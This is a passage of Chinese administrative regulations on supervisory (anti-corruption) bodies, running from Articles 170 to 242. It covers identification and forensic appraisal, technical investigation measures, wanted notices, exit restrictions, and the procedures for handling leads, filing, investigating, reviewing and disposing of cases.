进行调查实验，应当全程同步录音录像，制作调查实验笔录，由参加实验的人签名或者盖章。进行调查实验，禁止一切足以造成危险、侮辱人格的行为。</p><p>  调查实验的条件与事件发生时的条件有明显差异，或者存在影响实验结论科学性的其他情形的，调查实验笔录不得作为认定案件的依据。</p><p>  第一百七十一条  调查人员在必要时，可以依法让被害人、证人和被调查人对与违法犯罪有关的物品、文件、尸体或者场所进行辨认；也可以让被害人、证人对被调查人进行辨认，或者让被调查人对涉案人员进行辨认。</p><p>  辨认工作应当由二名以上调查人员主持进行。在辨认前，应当向辨认人详细询问辨认对象的具体特征，避免辨认人见到辨认对象，并告知辨认人作虚假辨认应当承担的法律责任。几名辨认人对同一辨认对象进行辨认时，应当由辨认人个别进行。辨认应当形成笔录，并由调查人员、辨认人签名或者盖章。</p><p>  第一百七十二条  辨认人员时，被辨认的人数不得少于七人，照片不得少于十张。</p><p>  辨认人不愿公开进行辨认时，应当在不暴露辨认人的情况下进行辨认，并为其保守秘密。</p><p>  第一百七十三条  组织辨认物品时一般应当辨认实物。被辨认的物品系名贵字画等贵重物品或者存在不便搬运等情况的，可以对实物照片进行辨认。辨认人进行辨认时，应当在辨认出的实物照片与附纸骑缝上捺指印予以确认，在附纸上写明该实物涉案情况并签名、捺指印。</p><p>  辨认物品时，同类物品不得少于五件，照片不得少于五张。</p><p>  对于难以找到相似物品的特定物，可以将该物品照片交由辨认人进行确认后，在照片与附纸骑缝上捺指印，在附纸上写明该物品涉案情况并签名、捺指印。在辨认人确认前，应当向其详细询问物品的具体特征，并对确认过程和结果形成笔录。</p><p>  第一百七十四条  辨认笔录具有下列情形之一的，不得作为认定案件的依据：</p><p>  （一）辨认开始前使辨认人见到辨认对象的；</p><p>  （二）辨认活动没有个别进行的；</p><p>  （三）辨认对象没有混杂在具有类似特征的其他对象中，或者供辨认的对象数量不符合规定的，但特定辨认对象除外；</p><p>  （四）辨认中给辨认人明显暗示或者明显有指认嫌疑的；</p><p>  （五）辨认不是在调查人员主持下进行的；</p><p>  （六）违反有关规定，不能确定辨认笔录真实性的其他情形。</p><p>  辨认笔录存在其他瑕疵的，应当结合全案证据审查其真实性和关联性，作出综合判断。</p><p>  <strong>第十五节  鉴    定</strong></p><p>  第一百七十五条  监察机关为解决案件中的专门性问题，按规定报批后，可以依法进行鉴定。</p><p>  鉴定时应当出具《委托鉴定书》，由二名以上调查人员送交具有鉴定资格的鉴定机构、鉴定人进行鉴定。</p><p>  第一百七十六条  监察机关可以依法开展下列鉴定：</p><p>  （一）对笔迹、印刷文件、污损文件、制成时间不明的文件和以其他形式表现的文件等进行鉴定；</p><p>  （二）对案件中涉及的财务会计资料及相关财物进行会计鉴定；</p><p>  （三）对被调查人、证人的行为能力进行精神病鉴定；</p><p>  （四）对人体造成的损害或者死因进行人身伤亡医学鉴定；</p><p>  （五）对录音录像资料进行鉴定；</p><p>  （六）对因电子信息技术应用而出现的材料及其派生物进行电子数据鉴定；</p><p>  （七）其他可以依法进行的专业鉴定。</p><p>  第一百七十七条  监察机关应当为鉴定提供必要条件，向鉴定人送交有关检材和对比样本等原始材料，介绍与鉴定有关的情况。调查人员应当明确提出要求鉴定事项，但不得暗示或者强迫鉴定人作出某种鉴定意见。</p><p>  监察机关应当做好检材的保管和送检工作，记明检材送检环节的责任人，确保检材在流转环节的同一性和不被污染。</p><p>  第一百七十八条  鉴定人应当在出具的鉴定意见上签名，并附鉴定机构和鉴定人的资质证明或者其他证明文件。多个鉴定人的鉴定意见不一致的，应当在鉴定意见上记明分歧的内容和理由，并且分别签名。</p><p>  监察机关对于法庭审理中依法决定鉴定人出庭作证的，应当予以协调。</p><p>  鉴定人故意作虚假鉴定的，应当依法追究法律责任。</p><p>  第一百七十九条  调查人员应当对鉴定意见进行审查。对经审查作为证据使用的鉴定意见，应当告知被调查人及相关单位、人员，送达《鉴定意见告知书》。</p><p>  被调查人或者相关单位、人员提出补充鉴定或者重新鉴定申请，经审查符合法定要求的，应当按规定报批，进行补充鉴定或者重新鉴定。</p><p>  对鉴定意见告知情况可以制作笔录，载明告知内容和被告知人的意见等。</p><p>  第一百八十条  经审查具有下列情形之一的，应当补充鉴定：</p><p>  （一）鉴定内容有明显遗漏的；</p><p>  （二）发现新的有鉴定意义的证物的；</p><p>  （三）对鉴定证物有新的鉴定要求的；</p><p>  （四）鉴定意见不完整，委托事项无法确定的；</p><p>  （五）其他需要补充鉴定的情形。</p><p>  第一百八十一条  经审查具有下列情形之一的，应当重新鉴定：</p><p>  （一）鉴定程序违法或者违反相关专业技术要求的；</p><p>  （二）鉴定机构、鉴定人不具备鉴定资质和条件的；</p><p>  （三）鉴定人故意作出虚假鉴定或者违反回避规定的；</p><p>  （四）鉴定意见依据明显不足的；</p><p>  （五）检材虚假或者被损坏的；</p><p>  （六）其他应当重新鉴定的情形。</p><p>  决定重新鉴定的，应当另行确定鉴定机构和鉴定人。</p><p>  第一百八十二条  因无鉴定机构，或者根据法律法规等规定，监察机关可以指派、聘请具有专门知识的人就案件的专门性问题出具报告。</p><p>  <strong>第十六节  技术调查</strong></p><p>  第一百八十三条  监察机关根据调查涉嫌重大贪污贿赂等职务犯罪需要，依照规定的权限和程序报经批准，可以依法采取技术调查措施，按照规定交公安机关或者国家有关执法机关依法执行。</p><p>  第一百八十四条  依法采取技术调查措施的，监察机关应当出具《采取技术调查措施委托函》《采取技术调查措施决定书》和《采取技术调查措施适用对象情况表》，送交有关机关执行。其中，设区的市级以下监察机关委托有关执行机关采取技术调查措施，还应当提供《立案决定书》。</p><p>  第一百八十五条  技术调查措施的期限按照监察法的规定执行，期限届满前未办理延期手续的，到期自动解除。</p><p>  对于不需要继续采取技术调查措施的，监察机关应当按规定及时报批，将《解除技术调查措施决定书》送交有关机关执行。</p><p>  需要依法变更技术调查措施种类或者增加适用对象的，监察机关应当重新办理报批和委托手续，依法送交有关机关执行。</p><p>  第一百八十六条  对于采取技术调查措施收集的信息和材料，依法需要作为刑事诉讼证据使用的，监察机关应当按规定报批，出具《调取技术调查证据材料通知书》向有关执行机关调取。</p><p>  对于采取技术调查措施收集的物证、书证及其他证据材料，监察机关应当制作书面说明，写明获取证据的时间、地点、数量、特征以及采取技术调查措施的批准机关、种类等。调查人员应当在书面说明上签名。</p><p>  对于采取技术调查措施获取的证据材料，如果使用该证据材料可能危及有关人员的人身安全，或者可能产生其他严重后果的，应当采取不暴露有关人员身份、技术方法等保护措施。必要时，可以建议由审判人员在庭外进行核实。</p><p>  第一百八十七条  调查人员对采取技术调查措施过程中知悉的国家秘密、工作秘密、商业秘密、个人隐私和个人信息，应当严格保密。</p><p>  采取技术调查措施获取的证据、线索及其他有关材料，只能用于对违法犯罪的调查、起诉和审判，不得用于其他用途。</p><p>  对采取技术调查措施获取的与案件无关的材料，应当经审批及时销毁。对销毁情况应当制作记录，由调查人员签名。</p><p>  <strong>第十七节  通    缉</strong></p><p>  第一百八十八条  县级以上监察机关对在逃的应当被留置人员，依法决定在本行政区域内通缉的，应当按规定报批，送交同级公安机关执行。送交执行时，应当出具《通缉决定书》，附《留置决定书》等法律文书和被通缉人员信息，以及承办单位、承办人员等有关情况。</p><p>  通缉范围超出本行政区域的，应当报有决定权的上级监察机关出具《通缉决定书》，并附《留置决定书》及相关材料，送交同级公安机关执行。</p><p>  第一百八十九条  国家监察委员会依法需要提请公安部对在逃人员发布公安部通缉令的，应当先提请公安部采取网上追逃措施。如情况紧急，可以向公安部同时出具《通缉决定书》和《提请采取网上追逃措施函》。</p><p>  省级以下监察机关报请国家监察委员会提请公安部发布公安部通缉令的，应当先提请本地公安机关采取网上追逃措施。</p><p>  第一百九十条  监察机关接到公安机关抓获被通缉人员的通知后，应当立即核实被抓获人员身份，并在接到通知后二十四小时以内派员办理交接手续。边远或者交通不便地区，至迟不得超过三日。</p><p>  公安机关在移交前，将被抓获人员送往当地监察机关留置场所临时看管的，当地监察机关应当接收，并保障临时看管期间的安全，对工作信息严格保密。</p><p>  监察机关需要提请公安机关协助将被抓获人员带回的，应当按规定报批，请本地同级公安机关依法予以协助。提请协助时，应当出具《提请协助采取留置措施函》，附《留置决定书》复印件及相关材料。</p><p>  第一百九十一条  监察机关对于被通缉人员已经归案、死亡，或者依法撤销留置决定以及发现有其他不需要继续采取通缉措施情形的，应当经审批出具《撤销通缉通知书》，送交协助采取原措施的公安机关执行。需要撤销网上追逃措施的，监察机关应当出具《撤销网上追逃通知书》，送交协助采取原措施的公安机关执行。</p><p>  <strong>第十八节  限制出境</strong></p><p>  第一百九十二条  监察机关为防止被调查人及相关人员逃匿境外，按规定报批后，可以依法决定采取限制出境措施，交由移民管理机构依法执行。</p><p>  第一百九十三条  监察机关采取限制出境措施应当出具有关函件，与采取限制出境措施决定书等文书材料一并送交移民管理机构执行。其中，采取边控措施的，应当附《边控对象通知书》；采取法定不批准出境措施的，应当附《法定不准出境人员报备表》。</p><p>  第一百九十四条  限制出境措施有效期不超过三个月，到期自动解除。</p><p>  到期后仍有必要继续采取边控措施的，应当按原程序报批。承办部门应当出具有关函件，在到期前与《延长限制出境措施期限决定书》一并送交移民管理机构执行。延长期限每次不得超过三个月。</p><p>  到期后仍有必要继续采取法定不批准出境措施的，应当在报备期满三日前按规定再次办理法定不批准出境人员报备手续。</p><p>  第一百九十五条  监察机关接到口岸移民管理机构查获被决定采取留置措施的边控对象的通知后，应当于二十四小时以内到达口岸办理移交手续。无法及时到达的，应当委托当地监察机关及时前往口岸办理移交手续。当地监察机关应当予以协助。</p><p>  第一百九十六条  对于不需要继续采取限制出境措施的，应当按规定报批，及时予以解除。承办部门应当出具有关函件，与《解除限制出境措施决定书》一并送交移民管理机构执行。</p><p>  第一百九十七条  县级以上监察机关在重要紧急情况下，经审批可以依法直接向口岸所在地口岸移民管理机构提请办理临时限制出境措施，期限不超过七日，不能延期。</p><h2 id="第五章-监察程序"><a href="#第五章-监察程序" class="headerlink" title="第五章  监察程序"></a>第五章  监察程序</h2><p>  <strong>第一节  线索处置</strong></p><p>  第一百九十八条  监察机关应当对问题线索归口受理、集中管理、分类处置、定期清理。</p><p>  第一百九十九条  监察机关对于报案或者举报应当依法接受。属于本级监察机关管辖的，依法予以受理；属于其他监察机关管辖的，应当在五个工作日以内予以转送。</p><p>  监察机关可以向下级监察机关发函交办检举控告，并进行督办，下级监察机关应当按期回复办理结果。</p><p>  第二百条  对于涉嫌职务违法或者职务犯罪的公职人员自动投案的，应当依法接待和办理。</p><p>  第二百零一条  监察机关对于执法机关、司法机关等其他机关移送的问题线索，应当及时审核，并按照下列方式办理：</p><p>  （一）本单位有管辖权的，及时研究提出处置意见；</p><p>  （二）本单位没有管辖权但其他监察机关有管辖权的，在五个工作日以内转送有管辖权的监察机关；</p><p>  （三）本单位对部分问题线索有管辖权的，对有管辖权的部分提出处置意见，并及时将其他问题线索转送有管辖权的机关；</p><p>  （四）监察机关没有管辖权的，及时退回移送机关。</p><p>  第二百零二条  信访举报部门归口受理本机关管辖监察对象涉嫌职务违法和职务犯罪问题的检举控告，统一接收有关监察机关以及其他单位移送的相关检举控告，移交本机关监督检查部门或者相关部门，并将移交情况通报案件监督管理部门。</p><p>  案件监督管理部门统一接收巡视巡察机构和审计机关、执法机关、司法机关等其他机关移送的职务违法和职务犯罪问题线索，按程序移交本机关监督检查部门或者相关部门办理。</p><p>  监督检查部门、调查部门在工作中发现的相关问题线索，属于本部门受理范围的，应当报送案件监督管理部门备案；属于本机关其他部门受理范围的，经审批后移交案件监督管理部门分办。</p><p>  第二百零三条  案件监督管理部门应当对问题线索实行集中管理、动态更新，定期汇总、核对问题线索及处置情况，向监察机关主要负责人报告，并向相关部门通报。</p><p>  问题线索承办部门应当指定专人负责管理线索，逐件编号登记、建立管理台账。线索管理处置各环节应当由经手人员签名，全程登记备查，及时与案件监督管理部门核对。</p><p>  第二百零四条  监督检查部门应当结合问题线索所涉及地区、部门、单位总体情况进行综合分析，提出处置意见并制定处置方案，经审批按照适当了解、谈话、函询、初步核实、暂存待查、予以了结等方式进行处置，或者按照职责移送调查部门处置。</p><p>  第二百零五条  采取适当了解方式处置问题线索，应当按规定报批后，依法依规向有关单位和个人了解情况，验证问题的真实性，不得采取限制人身、财产权利的措施，不得与被反映人接触。</p><p>  承办部门应当根据适当了解的情况，提出谈话、函询、初步核实、拟立案调查、予以了结、暂存待查，或者移送有关部门、机关处理等建议，按程序报批后办理。</p><p>  第二百零六条  采取谈话方式处置问题线索的，按照本条例第七十八条、第七十九条规定办理。</p><p>  函询应当以监察机关办公厅（室）名义发函给被反映人，并抄送其所在单位和派驻监察机构主要负责人。被函询人应当在收到函件后十五个工作日以内写出说明材料，由其所在单位主要负责人签署意见后发函回复。被函询人为所在单位主要负责人的，或者被函询人所作说明涉及所在单位主要负责人的，应当直接发函回复监察机关。</p><p>  被函询人已经退休的，按照第二款规定程序办理。</p><p>  监察机关根据工作需要，经审批可以对谈话、函询情况进行抽查核实。</p><p>  承办部门应当根据谈话、函询的情况，提出初步核实、拟立案调查、予以了结、暂存待查，或者移送有关部门、机关处理等建议，按程序报批后办理。</p><p>  第二百零七条  监察机关对具有可查性的职务违法和职务犯罪问题线索，应当按规定报批后，依法开展初步核实工作。采取初步核实方式处置问题线索，应当确定初步核实对象，制定工作方案，明确需要核实的问题和采取的措施，成立核查组。</p><p>  在初步核实中应当注重收集客观性证据，确保真实性和准确性。在初步核实中发现或者受理被核查人新的具有可查性的问题线索的，应当经审批纳入原初核方案开展核查。</p><p>  核查组在初步核实工作结束后应当撰写初步核实情况报告，列明被核查人基本情况、反映的主要问题、办理依据、初步核实结果、存在疑点、处理建议，由全体人员签名。</p><p>  承办部门应当综合分析初步核实情况，提出拟立案调查、予以了结、暂存待查，或者移送有关部门、机关处理等建议，按照批准初步核实的程序报批。</p><p>  第二百零八条  监察机关根据适当了解、谈话、函询或者初步核实情况，发现公职人员有职务违法行为但情节较轻的，可以按照本条例第二百三十一条规定处理，予以了结。</p><p>  第二百零九条  检举控告人使用本人真实姓名或者本单位名称，有电话等具体联系方式的，属于实名检举控告。监察机关对实名检举控告应当优先办理、优先处置，依法给予答复。虽有署名但不是检举控告人真实姓名（单位名称）或者无法验证的检举控告，按照匿名检举控告处理。</p><p>  信访举报部门对属于本机关受理的实名检举控告，应当在收到检举控告之日起十五个工作日以内按规定告知实名检举控告人受理情况，并做好记录。</p><p>  调查人员应当将实名检举控告的处理结果在办结之日起十五个工作日以内向检举控告人反馈，并记录反馈情况。对检举控告人提出异议的应当如实记录，并向其进行说明；对提供新证据材料的，应当依法核查处理。</p><p>  <strong>第二节  立    案</strong></p><p>  第二百一十条  监察机关已经掌握监察对象涉嫌职务违法或者职务犯罪的部分事实和证据，认为需要追究其法律责任的，应当按规定报批后，依法立案调查。</p><p>  第二百一十一条  监察机关立案调查职务违法或者职务犯罪案件，需要对涉嫌行贿犯罪、介绍贿赂犯罪或者共同职务犯罪的涉案人员立案调查的，应当一并办理立案手续。需要交由下级监察机关立案的，经审批交由下级监察机关办理立案手续。</p><p>  对单位涉嫌受贿、行贿等职务犯罪，需要追究法律责任的，依法对该单位办理立案调查手续。对事故（事件）中存在职务违法或者职务犯罪问题，需要追究法律责任，但相关责任人员尚不明确的，可以以事立案。对单位立案或者以事立案后，经调查确定相关责任人员的，按照管理权限报批确定被调查人。</p><p>  监察机关根据人民法院生效刑事判决、裁定和人民检察院不起诉决定认定的事实，需要对监察对象给予政务处分的，可以由相关监督检查部门依据司法机关的生效判决、裁定、决定及其认定的事实、性质和情节，提出给予政务处分的意见，按程序移送审理。对依法被追究行政法律责任的监察对象，需要给予政务处分的，应当依法办理立案手续。</p><p>  第二百一十二条  对案情简单、经过初步核实已查清主要职务违法事实，应当追究监察对象法律责任，不再需要开展调查的，立案和移送审理可以一并报批，履行立案程序后再移送审理。</p><p>  第二百一十三条  上级监察机关需要指定下级监察机关立案调查的，应当按规定报批，向被指定管辖的监察机关出具《指定管辖决定书》，由其办理立案手续。</p><p>  第二百一十四条  批准立案后，应当由二名以上调查人员出示证件，向被调查人宣布立案决定。宣布立案决定后，应当及时向被调查人所在单位等相关组织送达《立案通知书》，并向被调查人所在单位主要负责人通报。</p><p>  对涉嫌严重职务违法或者职务犯罪的公职人员立案调查并采取留置措施的，应当按规定通知被调查人所在单位和家属，并向社会公开发布。</p><p>  <strong>第三节  调    查</strong></p><p>  第二百一十五条  监察机关对已经立案的职务违法或者职务犯罪案件应当依法进行调查，收集证据查明违法犯罪事实。</p><p>  调查职务违法或者职务犯罪案件，对被调查人没有采取留置措施的，应当在立案后一年以内作出处理决定；对被调查人解除留置措施的，应当在解除留置措施后一年以内作出处理决定。案情重大、复杂的案件，经上一级监察机关批准，可以适当延长，但延长期限不得超过六个月。</p><p>  被调查人在监察机关立案调查以后逃匿的，调查期限自被调查人到案之日起重新计算。</p><p>  第二百一十六条  案件立案后，监察机关主要负责人应当依照法定程序批准确定调查方案。</p><p>  监察机关应当组成调查组依法开展调查。调查工作应当严格按照批准的方案执行，不得随意扩大调查范围、变更调查对象和事项，对重要事项应当及时请示报告。调查人员在调查工作期间，未经批准不得单独接触任何涉案人员及其特定关系人，不得擅自采取调查措施。</p><p>  第二百一十七条  调查组应当将调查认定的涉嫌违法犯罪事实形成书面材料，交给被调查人核对，听取其意见。被调查人应当在书面材料上签署意见。对被调查人签署不同意见或者拒不签署意见的，调查组应当作出说明或者注明情况。对被调查人提出申辩的事实、理由和证据应当进行核实，成立的予以采纳。</p><p>  调查组对于立案调查的涉嫌行贿犯罪、介绍贿赂犯罪或者共同职务犯罪的涉案人员，在查明其涉嫌犯罪问题后，依照前款规定办理。</p><p>  对于按照本条例规定，对立案和移送审理一并报批的案件，应当在报批前履行本条第一款规定的程序。</p><p>  第二百一十八条  调查组在调查工作结束后应当集体讨论，形成调查报告。调查报告应当列明被调查人基本情况、问题线索来源及调查依据、调查过程，涉嫌的主要职务违法或者职务犯罪事实，被调查人的态度和认识，处置建议及法律依据，并由调查组组长以及有关人员签名。</p><p>  对调查过程中发现的重要问题和形成的意见建议，应当形成专题报告。</p><p>  第二百一十九条  调查组对被调查人涉嫌职务犯罪拟依法移送人民检察院审查起诉的，应当起草《起诉建议书》。《起诉建议书》应当载明被调查人基本情况，调查简况，认罪认罚情况，采取监察强制措施的时间，涉嫌职务犯罪事实以及证据，对被调查人从重、从轻、减轻或者免除处罚等情节，提出对被调查人移送起诉的理由和法律依据，采取刑事强制措施的建议，并注明移送案卷数及涉案财物等内容。</p><p>  调查组应当形成被调查人到案经过及量刑情节方面的材料，包括案件来源、到案经过，自动投案、如实供述、立功等量刑情节，认罪悔罪态度、退赃、避免和减少损害结果发生等方面的情况说明及相关材料。被检举揭发的问题已被立案、查破，被检举揭发人已被采取调查措施或者刑事强制措施、起诉或者审判的，还应当附有关法律文书。</p><p>  第二百二十条  经调查认为被调查人构成职务违法或者职务犯罪的，应当区分不同情况提出相应处理意见，经审批将调查报告、职务违法或者职务犯罪事实材料、涉案财物报告、涉案人员处理意见等材料，连同全部证据和文书手续移送审理。</p><p>  对涉嫌职务犯罪的案件材料应当按照刑事诉讼要求单独立卷，与《起诉建议书》、涉案财物报告、同步录音录像资料及其自查报告等材料一并移送审理。</p><p>  调查全过程形成的材料应当案结卷成、事毕归档。</p><p>  <strong>第四节  审    理</strong></p><p>  第二百二十一条  案件审理部门收到移送审理的案件后，应当审核材料是否齐全、手续是否完备。对被调查人涉嫌职务犯罪的，还应当审核相关案卷材料是否符合职务犯罪案件立卷要求，是否在调查报告中单独表述已查明的涉嫌犯罪问题，是否形成《起诉建议书》。</p><p>  经审核符合移送条件的，应当予以受理；不符合移送条件的，经审批可以暂缓受理或者不予受理，并要求承办部门补充完善材料。</p><p>  第二百二十二条  案件审理部门受理案件后，应当成立由二人以上组成的审理组，全面审理案卷材料。</p><p>  案件审理部门对于受理的案件，应当以监察法、政务处分法、刑法、《中华人民共和国刑事诉讼法》等法律法规为准绳，对案件事实和证据、性质认定、程序手续、涉案财物等进行全面审理。</p><p>  案件审理部门应当强化监督制约职能，对案件严格审核把关，坚持实事求是、独立审理，依法提出审理意见。坚持调查与审理相分离的原则，案件调查人员不得参与审理。</p><p>  第二百二十三条  审理工作应当坚持民主集中制原则，经集体审议形成审理意见。</p><p>  第二百二十四条  审理工作应当在受理之日起一个月以内完成，重大、复杂案件经批准可以适当延长。</p><p>  第二百二十五条  案件审理部门根据案件审理情况，经审批可以与被调查人谈话，告知其在审理阶段的权利义务，核对涉嫌违法犯罪事实，听取其辩解意见，了解有关情况。与被调查人谈话应当在具备安全保障条件的场所进行，被调查人为在押的犯罪嫌疑人、被告人或者在看守所、监狱服刑人员的，按照本条例第八十三条规定办理。谈话时，案件审理人员不得少于二人。</p><p>  具有下列情形之一的，一般应当与被调查人谈话：</p><p>  （一）对被调查人采取留置措施，拟移送起诉的；</p><p>  （二）可能存在以非法方法收集证据情形的；</p><p>  （三）被调查人对涉嫌违法犯罪事实材料签署不同意见或者拒不签署意见的；</p><p>  （四）被调查人要求向案件审理人员当面陈述的；</p><p>  （五）其他有必要与被调查人进行谈话的情形。</p><p>  第二百二十六条  经审理认为主要违法犯罪事实不清、证据不足的，应当经审批将案件退回承办部门重新调查。</p><p>  具有下列情形之一，需要补充完善证据的，经审批可以退回补充调查：</p><p>  （一）部分事实不清、证据不足的；</p><p>  （二）遗漏违法犯罪事实的；</p><p>  （三）其他需要进一步查清案件事实的情形。</p><p>  案件审理部门将案件退回重新调查或者补充调查的，应当出具审核意见，写明调查事项、理由、调查方向、需要补充收集的证据及其证明作用等，连同案卷材料一并送交承办部门。</p><p>  承办部门补充调查结束后，应当经审批将补证情况报告及相关证据材料，连同案卷材料一并移送案件审理部门；对确实无法查明的事项或者无法补充的证据，应当作出书面说明。重新调查终结后，应当重新形成调查报告，依法移送审理。</p><p>  重新调查完毕移送审理的，审理期限重新计算。补充调查期间不计入审理期限。</p><p>  第二百二十七条  审理工作结束后应当形成审理报告，载明被调查人基本情况、调查简况、涉嫌违法或者犯罪事实、被调查人态度和认识、涉案财物处置、承办部门意见、审理意见等内容，提请监察机关集体审议。</p><p>  对被调查人涉嫌职务犯罪需要追究刑事责任的，应当形成《起诉意见书》，作为审理报告附件。《起诉意见书》应当忠实于事实真象，载明被调查人基本情况，调查简况，采取监察强制措施的时间，依法查明的犯罪事实和证据，从重、从轻、减轻或者免除处罚等情节，涉案财物情况，涉嫌罪名和法律依据，采取刑事强制措施的建议，以及其他需要说明的情况。</p><p>  案件审理部门经审理认为现有证据不足以证明被调查人存在违法犯罪行为，且通过退回补充调查仍无法达到证明标准的，应当提出撤销案件的建议。</p><p>  第二百二十八条  上级监察机关办理下级监察机关管辖案件的，可以经审理后按程序直接进行处置，也可以经审理形成处置意见后，交由下级监察机关办理。</p><p>  第二百二十九条  被指定管辖的监察机关在调查结束后应当将案件移送审理，提请监察机关集体审议。</p><p>  上级监察机关将其所管辖的案件指定管辖的，被指定管辖的下级监察机关应当按照前款规定办理后，将案件报上级监察机关依法作出政务处分决定。上级监察机关在作出决定前，应当进行审理。</p><p>  上级监察机关将下级监察机关管辖的案件指定其他下级监察机关管辖的，被指定管辖的监察机关应当按照第一款规定办理后，将案件送交有管理权限的监察机关依法作出政务处分决定。有管理权限的监察机关应当进行审理，审理意见与被指定管辖的监察机关意见不一致的，双方应当进行沟通；经沟通不能取得一致意见的，报请有权决定的上级监察机关决定。经协商，有管理权限的监察机关在被指定管辖的监察机关审理阶段可以提前阅卷，沟通了解情况。</p><p>  对于前款规定的重大、复杂案件，被指定管辖的监察机关经集体审议后将处理意见报有权决定的上级监察机关审核同意的，有管理权限的监察机关可以经集体审议后依法处置。</p><p>  <strong>第五节  处    置</strong></p><p>  第二百三十条  监察机关根据监督、调查结果，依据监察法、政务处分法等规定进行处置。</p><p>  第二百三十一条  监察机关对于公职人员有职务违法行为但情节较轻的，可以依法进行谈话提醒、批评教育、责令检查，或者予以诫勉。上述方式可以单独使用，也可以依据规定合并使用。</p><p>  谈话提醒、批评教育应当由监察机关相关负责人或者承办部门负责人进行，可以由被谈话提醒、批评教育人所在单位有关负责人陪同；经批准也可以委托其所在单位主要负责人进行。对谈话提醒、批评教育情况应当制作记录。</p><p>  被责令检查的公职人员应当作出书面检查并进行整改。整改情况在一定范围内通报。</p><p>  诫勉由监察机关以谈话或者书面方式进行。采取谈话方式予以诫勉的，应当由监察机关相关负责人或者承办部门负责人进行；经批准也可以委托诫勉对象所在单位主要负责人进行。对谈话情况应当制作记录。</p><p>  第二百三十二条  对违法的公职人员依法需要给予政务处分的，应当根据情节轻重作出警告、记过、记大过、降级、撤职、开除的政务处分决定，制作政务处分决定书。</p><p>  第二百三十三条  监察机关应当将政务处分决定书在作出后一个月以内送达被处分人和被处分人所在机关、单位，并依法履行宣布、书面告知程序。</p><p>  政务处分决定自作出之日起生效。有关机关、单位、组织应当依法及时执行处分决定，并将执行情况向监察机关报告。处分决定应当在作出之日起一个月以内执行完毕，特殊情况下经监察机关批准可以适当延长办理期限，最迟不得超过六个月。</p><p>  第二百三十四条  监察机关对不履行或者不正确履行职责造成严重后果或者恶劣影响的领导人员，可以按照管理权限采取通报、诫勉、政务处分等方式进行问责；提出组织处理的建议。</p><p>  第二百三十五条  监察机关依法向监察对象所在单位提出监察建议的，应当经审批制作监察建议书。</p><p>  监察建议书一般应当包括下列内容：</p><p>  （一）监督调查情况；</p><p>  （二）发现的主要问题及其产生的原因；</p><p>  （三）整改建议内容和要求；</p><p>  （四）整改期限和反馈整改情况的要求；</p><p>  （五）提出异议的期限和方式。</p><p>  第二百三十六条  监察机关在研究提出监察建议过程中，应当坚持问题导向、系统观念，加强分析研判，保证监察建议质量。</p><p>  监察机关可以采取专题调研、部门会商、征求特约监察员等有关人员意见，以及与被建议单位或者其他有关方面沟通等方式，提高监察建议的针对性、可行性。</p><p>  第二百三十七条  监察机关经调查，对没有证据证明或者现有证据不足以证明被调查人存在违法犯罪行为的，应当依法撤销案件。省级以下监察机关撤销案件后，应当在七个工作日以内向上一级监察机关报送备案报告。上一级监察机关监督检查部门负责备案工作。</p><p>  省级以下监察机关拟撤销上级监察机关指定管辖或者交办案件的，应当将《撤销案件意见书》连同案卷材料，在法定调查期限到期七个工作日前报指定管辖或者交办案件的监察机关审查。对于重大、复杂案件，在法定调查期限到期十个工作日前报指定管辖或者交办案件的监察机关审查。</p><p>  指定管辖或者交办案件的监察机关由监督检查部门负责审查工作。指定管辖或者交办案件的监察机关同意撤销案件的，下级监察机关应当作出撤销案件决定，制作《撤销案件决定书》；指定管辖或者交办案件的监察机关不同意撤销案件的，下级监察机关应当执行该决定。</p><p>  监察机关对于撤销案件的决定应当向被调查人宣布，由其在《撤销案件决定书》上签名、捺指印，立即解除监察强制措施，并通知其所在单位。</p><p>  撤销案件后又发现重要事实或者有充分证据，认为被调查人有违法犯罪事实需要追究法律责任的，应当重新立案调查。</p><p>  第二百三十八条  对于涉嫌行贿等犯罪的非监察对象，案件调查终结后依法移送起诉。综合考虑行为性质、手段、后果、时间节点、认罪悔罪态度等具体情况，对于情节较轻，经审批不予移送起诉的，应当采取批评教育、责令具结悔过等方式处置；应当给予行政处罚的，依法移送有关行政执法部门。</p><p>  对于有行贿行为的涉案单位和人员，按规定记入相关信息记录，可以作为信用评价的依据。</p><p>  对于涉案单位和人员通过行贿等非法手段取得的财物及孳息，应当依法予以没收、追缴或者责令退赔，不得没收、追缴与案件无关的财物。对于涉案单位和人员主动上交的涉案财物，应当严格核查，确系违法所得及孳息的，依法予以没收、追缴。对于违法取得的经营资格、资质、荣誉、奖励、学历学位、职称或者职务职级等其他不正当利益，应当建议有关机关、单位、组织依照法律法规及有关规定予以纠正处理。</p><p>  第二百三十九条  对查封、扣押、冻结的涉嫌职务犯罪所得财物及孳息应当妥善保管，并制作《移送司法机关涉案财物清单》随案移送人民检察院。对作为证据使用的实物应当随案移送；对不宜移送的，应当将清单、照片和其他证明文件随案移送。</p><p>  对于移送人民检察院的涉案财物，价值不明的，应当在移送起诉前委托进行价格认定。在价格认定过程中，需要对涉案财物先行作出真伪鉴定或者出具技术、质量检测报告的，应当委托有关鉴定机构或者检测机构进行真伪鉴定或者技术、质量检测。</p><p>  对不属于犯罪所得但属于违法取得的财物及孳息，应当依法予以没收、追缴或者责令退赔，并出具有关法律文书。</p><p>  对经认定不属于违法所得的财物及孳息，应当及时予以返还，并办理签收手续。</p><p>  第二百四十条  监察机关经调查，对违法取得的财物及孳息决定追缴或者责令退赔的，可以依法要求公安、自然资源、住房城乡建设、市场监管、金融监管等部门以及银行等机构、单位予以协助。</p><p>  追缴涉案财物以追缴原物为原则，原物已经转化为其他财物的，应当追缴转化后的财物。涉案财物已被用于清偿合法债务、转让或者设置其他权利负担，善意第三人通过正常市场交易、支付合理对价，并实际取得相应权利的，不得对善意取得的财物进行追缴。</p><p>  有证据证明依法应当追缴、没收的涉案财物无法找到、被他人善意取得、价值灭失减损或者与其他合法财产混合且不可分割的，可以依法追缴、没收被调查人的其他等值财产。</p><p>  追缴或者责令退赔应当自处置决定作出之日起一个月以内执行完毕。因被调查人的原因逾期执行的除外。</p><p>  人民检察院、人民法院依法将不认定为犯罪所得的相关涉案财物退回监察机关的，监察机关应当依法处理。</p><p>  第二百四十一条  监察对象对监察机关作出的涉及本人的处理决定不服的，可以在收到处理决定之日起一个月以内，向作出决定的监察机关申请复审。复审机关应当依法受理，并在受理后一个月以内作出复审决定。监察对象对复审决定仍不服的，可以在收到复审决定之日起一个月以内，向上一级监察机关申请复核。复核机关应当依法受理，并在受理后二个月以内作出复核决定。</p><p>  上一级监察机关的复核决定和国家监察委员会的复审、复核决定为最终决定。</p><p>  第二百四十二条  